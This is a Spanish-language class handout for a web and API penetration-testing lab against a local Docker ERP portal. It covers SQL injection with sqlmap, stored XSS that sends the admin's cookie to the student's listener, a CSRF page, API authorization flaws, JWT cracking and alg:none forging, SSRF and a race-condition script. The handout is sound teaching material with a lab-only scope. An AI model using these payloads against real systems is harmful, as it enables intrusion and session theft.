# Clase 05 · Ataques a Servicios Web y APIs
### Portal ERP Qhapaq — romper la aplicación, no solo el servidor

> **Duración:** 4 horas (240 min) · **Modalidad:** full práctica.
> **Entorno:** Docker dentro de tu Kali. App propia en `10.50.0.10:5000` (y `localhost:5000`).
> **La historia continúa:** en la Clase 04 entraste al servidor del ERP. Hoy atacas la
> **aplicación web y su API**: lo que ningún escaneo de puertos te iba a dar.
>
> ⚖️ **Ética:** OWASP y estas técnicas son legales **solo** contra este laboratorio, Juice Shop,
> o un alcance autorizado por escrito.

---

## Agenda

| Bloque | Tiempo | Tema |
|---|---|---|
| Teoría exprés | 15 | OWASP Top 10 2025 (Web + API) · el proxy de intercepción |
| Lab 0 | 10 | Entorno + configurar Burp/Caido/ZAP |
| Lab 1 | 40 | **Inyección SQL** (bypass, UNION, sqlmap) |
| Lab 2 | 30 | **XSS y HTML injection** (reflejado y almacenado) |
| — | 10 | **Pausa** |
| Lab 3 | 30 | **CSRF + malas configuraciones** |
| Lab 4 | 45 | **Ataques a la API** (BOLA/IDOR, BFLA, exposición, mass assignment, JWT) |
| Lab 5 | 30 | **SSRF, Fuzzing y Race Condition** |
| Lab 6 | 20 | OWASP Juice Shop (reto libre) |
| Cierre | 10 | Reporte y entrega |

**Meta mínima:** banderas 23 a 30. Las 31–33 (SSRF, race y robo de sesión por XSS) son "para los más pros".

---

## Teoría exprés (15 min)

**OWASP Top 10** es la lista de los 10 riesgos web más críticos. Hoy tocas los principales:

| Código | Riesgo | Dónde lo verás hoy |
|---|---|---|
| A01 | Control de acceso roto | IDOR, CSRF, BFLA |
| A03 | Inyección | SQLi, XSS, HTML |
| A05 | Mala configuración | debug, backup.sql, errores verbosos |
| A07 | Fallos de identificación/autenticación | JWT débil, alg:none |
| A10 | SSRF | /api/fetch |

**OWASP API Top 10** (lista hermana, para APIs):
- **API1 BOLA** (Broken Object Level Auth) = IDOR: pides el objeto de otro y te lo dan.
- **API3** Exposición excesiva de datos: la API devuelve más de lo que debería (¡contraseñas!).
- **API5 BFLA** (Broken Function Level Auth): usas una función de admin con un token de usuario.
- **API6** Asignación masiva: mandas campos de más (`role=admin`) y los acepta.

**El proxy de intercepción** (Burp / Caido / ZAP) es tu herramienta central: se sienta
**entre tu navegador y la app**, y te deja **ver, pausar y modificar** cada petición. Todo lo
de hoy pasa por ahí. Son equivalentes; usa el que te guste:
- **Burp Suite Community** — el estándar de la industria (ya lo tienen instalado).
- **Caido** — moderno, ligero, en Rust; alternativa cómoda.
- **OWASP ZAP** — libre y gratuito, con escáner automático.

---

## Lab 0 · Entorno + proxy (10 min)

```bash
cd Clase-05
./scripts/00-verificar-entorno.sh
cd objetivo
docker compose up -d --build          # levanta el portal
docker compose ps
curl -s http://10.50.0.10:5000/ | head
```

**Configura el proxy (una vez):**
1. Abre Burp (o Caido/ZAP). El proxy escucha en `127.0.0.1:8080`.
2. En Firefox: Preferencias → Red → Proxy manual → `127.0.0.1:8080` (HTTP y HTTPS).
3. Instala el certificado de Burp: navega a `http://burp` → "CA Certificate" → impórtalo en Firefox.
4. Navega a `http://10.50.0.10:5000`. En Burp, pestaña **Proxy → HTTP history**: deberías ver tus peticiones.

> Si Burp interfiere con Docker, apunta el navegador a `http://localhost:5000` (el portal
> publica ese puerto también).

---

## Lab 1 · Inyección SQL (40 min)

### 1.1 — Bypass de login (la inyección más famosa)
En `/login`, el código hace: `SELECT * FROM users WHERE username='<tú>' AND password='<tú>'`.
Si cierras la comilla y comentas el resto, entras **sin contraseña**:
```
usuario:  admin'-- -
clave:    (cualquier cosa)
```
Entras como admin. Ve a `/perfil` → 🚩 **bandera 23**.

> 💡 En Burp: captura el POST del login, mándalo a **Repeater** (Ctrl+R) y prueba variantes
> (`admin' OR '1'='1'-- -`) sin tocar el navegador.

### 1.2 — Extracción con UNION
El endpoint `/factura?id=1001` concatena el `id` **sin comillas** (inyección numérica).
```bash
# ¿cuántas columnas? el detalle sale con 3
curl "http://10.50.0.10:5000/factura?id=0 UNION SELECT username,role,password FROM users-- -"
```
Verás el usuario, rol y **contraseña de cada cuenta**. Prueba también:
- booleana: `id=1001 AND 1=1` (aparece) vs `id=1001 AND 1=2` (desaparece)
- error: `id=1001'` (te muestra el error de SQLite → mala config, A05)

### 1.3 — Automatizar con sqlmap
Cuando ya entiendes la inyección a mano, sqlmap la explota sola:
```bash
sqlmap -u "http://10.50.0.10:5000/factura?id=1001" -p id --batch --dbms sqlite
sqlmap -u "http://10.50.0.10:5000/factura?id=1001" -p id --batch --dump -T users
```
Volcará toda la tabla `users` con sus contraseñas.

> 🎯 **Bandera 23.** Lección: nunca concatenes entrada del usuario en SQL. Usa consultas
> parametrizadas (`?`). sqlmap es rápido, pero entiende primero **por qué** funciona.

---

## Lab 2 · XSS y HTML injection (30 min)

### 2.1 — XSS reflejado
```
http://10.50.0.10:5000/saludo?nombre=<script>alert(document.domain)</script>
```
Tu `nombre` se inserta en el HTML **sin escapar** → se ejecuta tu JavaScript.

### 2.2 — XSS almacenado: roba la sesión del admin (🚩 bandera 33)
En `/comentarios`, publica un comentario con:
```html
<script>document.title='hackeado'</script>
```
Ahora **cada visitante** que abra `/comentarios` ejecuta tu código. En este portal hay un
**administrador** que revisa los comentarios cada pocos segundos con su sesión abierta: roba
su cookie.

**1) Averigua la IP de tu Kali en la red del laboratorio** (es el *gateway* de Docker, normalmente `10.50.0.1`):
```bash
ip -4 addr show docker0 2>/dev/null | grep -o 'inet [0-9.]*'   # o 'hostname -I'
```

**2) Levanta un listener** en tu Kali para recibir lo robado:
```bash
python3 -m http.server 8000
```

**3) Publica el payload** que lee la cookie del admin y la envía a tu listener
(cambia la IP por la de tu Kali):
```html
<script>new Image().src='http://10.50.0.1:8000/x?c='+document.cookie</script>
```

**4) Espera ~8 s.** En la consola del listener verás llegar la cookie del admin:
```
"GET /x?c=token%3DeyJhbGciOi... HTTP/1.1"
```

**5) Usa la cookie robada** para entrar como admin y recoger el trofeo:
```bash
# copia el valor del token (lo que va tras c=token%3D, quitando el %3D que es '=')
curl http://10.50.0.10:5000/admin/trofeo -b "token=EL-TOKEN-ROBADO"   # 🚩 bandera 33
```
> ⚠️ Ojo: el trofeo **solo** lo abre la cookie real del admin. Un token forjado con `alg:none`
> (Lab 4) **no** sirve aquí: esto demuestra que el XSS roba una **sesión viva**, no una falsificada.

### 2.3 — HTML injection
Si no logras `<script>` (por un filtro), aún puedes **deformar la página** o poner un
formulario falso de login:
```html
<h1>Mantenimiento</h1><form action='http://TU-KALI:8000'>Usuario:<input name=u></form>
```

> 🎯 **Bandera 33.** Lección: escapa **toda** salida (`&lt;` en vez de `<`); usa cookies de
> sesión `HttpOnly` para que el JavaScript no pueda leerlas. La diferencia entre reflejado y
> almacenado es **a quién** afecta: el almacenado golpea a todo el que abra la página, el admin incluido.

---

## ☕ Pausa (10 min)

---

## Lab 3 · CSRF + malas configuraciones (30 min)

### 3.1 — CSRF: cambiar el email de la víctima desde otra web
El formulario de `/perfil` **no lleva token anti-CSRF**. Crea en tu Kali un archivo `csrf.html`:
```html
<form action="http://10.50.0.10:5000/perfil" method="POST">
  <input type="hidden" name="email" value="atacante@malo.com">
</form>
<script>document.forms[0].submit()</script>
```
Si la víctima (con su sesión abierta) visita tu página, su email cambia **sin que lo sepa**.
En un banco, ese formulario sería una transferencia.

### 3.2 — Malas configuraciones (A05)
Mira el comentario HTML de la página de inicio (`Ctrl+U`): delata rutas. Pruébalas:
```bash
curl http://10.50.0.10:5000/debug        # 🚩 bandera 24 — variables de entorno y el secreto JWT
curl http://10.50.0.10:5000/backup.sql   # 🚩 bandera 25 — respaldo con credenciales
```
El modo *debug* de Flask, los errores SQL verbosos y un `backup.sql` accesible son tres
configuraciones que nunca deben llegar a producción.

> 🎯 **Banderas 24 y 25.** Lección: CSRF se evita con tokens; las malas configs, quitando
> rutas de depuración y cerrando mensajes de error.

---

## Lab 4 · Ataques a la API (45 min)

La API vive bajo `/api/`. Explórala con Burp o `curl`.

### 4.1 — BOLA / IDOR (API1) — factura ajena
```bash
curl http://10.50.0.10:5000/api/invoices/1001   # la tuya
curl http://10.50.0.10:5000/api/invoices/1002   # ¡la de gerencia! 🚩 bandera 26
```
La API no comprueba que la factura sea **tuya**. Cambiar el número = ver datos de otros.

### 4.2 — Exposición excesiva de datos (API3)
```bash
curl http://10.50.0.10:5000/api/users/2         # 🚩 bandera 27
```
Devuelve **la contraseña y el campo secreto**. La API debería filtrar qué campos entrega.

### 4.3 — Mass assignment (API6) — hazte admin al registrarte
```bash
curl -X POST http://10.50.0.10:5000/registro --data "username=hax&password=x&role=admin"
```
El registro acepta el campo `role` que mandes → 🚩 **bandera 30**. Nunca confíes en campos
que el cliente no debería poder fijar.

### 4.4 — BFLA (API5) — función de admin con token de usuario
Inicia sesión como `rhuaman` (usuario normal) y usa su token contra el endpoint de admin:
```bash
TOK=$(curl -s -i -X POST http://10.50.0.10:5000/login \
  --data "username=rhuaman&password=Qhapaq2024#" | grep -i set-cookie | sed 's/.*token=//;s/;.*//')
curl http://10.50.0.10:5000/api/admin/flag -b "token=$TOK"   # 🚩 bandera 29
```
El endpoint comprueba que **haya** token, pero no que el rol sea admin.

### 4.5 — JWT con secreto débil (A07) — forjar un admin
El token es un **JWT** firmado con un secreto débil. Dos ataques:

**a) Crackear el secreto** (guarda tu token en `jwt.txt`):
```bash
hashcat -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt      # -m 16500 = JWT HS256
#   → secreto: qhapaq
# alternativa cómoda, instalada en Kali:  jwt_tool jwt.txt -C -d /usr/share/wordlists/rockyou.txt
```
Con el secreto firmas un token con `"role":"admin"` (en jwt.io, con `jwt_tool ... -T`, o PyJWT).
> Si usas `john`, necesita la versión *jumbo* de Kali; `hashcat -m 16500` es lo más directo.

**b) Más fácil aún — `alg:none`:** la app acepta tokens sin firma. Forja uno:
```bash
H=$(printf '{"alg":"none","typ":"JWT"}' | base64 -w0 | tr '+/' '-_' | tr -d '=')
P=$(printf '{"uid":1,"role":"admin"}'   | base64 -w0 | tr '+/' '-_' | tr -d '=')
curl http://10.50.0.10:5000/api/admin/config -b "token=$H.$P."   # 🚩 bandera 28
```

> 🎯 **Banderas 26–30.** Lección: la autorización se valida **en el servidor, por cada objeto
> y cada función**, nunca confiando en el id, el rol o el token que manda el cliente.

---

## Lab 5 · SSRF, Fuzzing y Race Condition (30 min)

### 5.1 — SSRF (A10) — que el servidor pida por ti
`/api/fetch?url=` descarga la URL que le pases **desde el servidor**. Eso te deja llegar a
sitios internos que tú no alcanzas:
```bash
# el endpoint /interno/metadata solo responde a 127.0.0.1... pero el servidor ES 127.0.0.1
curl "http://10.50.0.10:5000/interno/metadata"                               # 403 para ti
curl "http://10.50.0.10:5000/api/fetch?url=http://127.0.0.1:5000/interno/metadata"  # 🚩 31
```
En la nube, así se roban credenciales del endpoint de metadatos (`169.254.169.254`).

### 5.2 — Fuzzing de rutas con ffuf
Descubre endpoints ocultos probando una lista de nombres:
```bash
ffuf -u http://10.50.0.10:5000/FUZZ -w /usr/share/wordlists/dirb/common.txt -mc 200,302,403
```
Encontrarás `/debug`, `/backup.sql`, `/api/...`. También puedes fuzzear parámetros e ids.

### 5.3 — Race condition — canjear un cupón de un solo uso, dos veces
El cupón `BIENVENIDA50` suma S/50 y se marca usado... pero hay una **ventana** entre leer y
escribir. Si mandas muchas peticiones **a la vez**, varias pasan antes de marcarse:
```bash
TOK=$(curl -s -i -X POST http://10.50.0.10:5000/login \
  --data "username=rhuaman&password=Qhapaq2024#" | grep -i set-cookie | sed 's/.*token=//;s/;.*//')
for i in $(seq 1 15); do
  curl -s http://10.50.0.10:5000/api/canjear -b "token=$TOK" \
    -H 'Content-Type: application/json' -d '{"code":"BIENVENIDA50"}' &
done; wait
```
El saldo sube muy por encima de S/50 → 🚩 **bandera 32**. En Burp Suite esto se hace con el
ataque **"single-packet" del Turbo Intruder** o enviando un grupo en paralelo.

> 🎯 **Banderas 31 y 32.** Lección: valida el origen de las peticiones (SSRF) y usa bloqueos o
> transacciones atómicas (race). "Comprobar y luego actuar" en dos pasos = agujero.

---

## Lab 6 · OWASP Juice Shop (20 min, reto libre)

Juice Shop es la aplicación vulnerable de referencia mundial de OWASP: cientos de retos reales.
```bash
docker compose --profile juice up -d        # tarda: descarga la imagen oficial
# abre http://localhost:3000
```
Reto para hoy (elige uno):
- Encuentra el **panel de puntajes** oculto (pista: fuzzing de rutas).
- Haz un **login bypass por SQLi** en el formulario de acceso.
- Provoca un **XSS** en la barra de búsqueda.

> Juice Shop lleva su propio marcador de retos. Es tu campo de práctica para después del curso.

---

## Cierre y entrega (10 min)

**Entrega — un mini-reporte de pentest web** (usa `plantillas/hallazgo-web.md`) con **3 hallazgos**
a tu elección, cada uno con:
- Riesgo OWASP (código y nombre) y severidad
- Petición exacta que lo demuestra (captura de Burp o comando curl)
- Impacto en el negocio (¿qué consigue el atacante?)
- Remediación concreta (1–2 líneas)

> Igual que siempre: se evalúa que demuestres el **cómo** y el **impacto**, no la bandera suelta.

**La superficie de hoy, de un vistazo:**
```
Web:  SQLi (login + UNION + sqlmap) · XSS (reflejado/almacenado) · HTML inj · CSRF · misconfig
API:  IDOR/BOLA · exposición de datos · BFLA · mass assignment · JWT (secreto débil / alg:none)
Extra: SSRF · fuzzing (ffuf) · race condition
```

**Cierre del módulo:** juntaste reconocimiento (C3) → explotación de servicios (C4) →
explotación de la aplicación (C5). Eso es un pentest completo: de "no sé nada de la empresa"
a "controlo su ERP y sus datos". En la próxima unidad: cómo **reportarlo** para que lo arreglen.
